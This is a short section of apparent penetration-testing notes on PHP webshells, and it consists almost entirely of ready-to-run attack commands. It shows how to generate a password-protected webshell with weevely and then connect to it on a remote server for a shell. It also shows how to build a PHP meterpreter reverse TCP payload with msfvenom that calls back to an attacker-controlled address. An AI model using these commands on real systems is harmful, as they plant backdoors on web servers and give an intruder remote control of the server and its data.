# Webshells

## PHP

These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.

### weevely

Using weevely we can create php webshells:

```
weevely generate password /root/webshell.php
```

Now we execute it, point it to the remote page and get a shell in return:

```
weevely "http://192.168.1.101/webshell.php" password
```

### msfvenom

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```



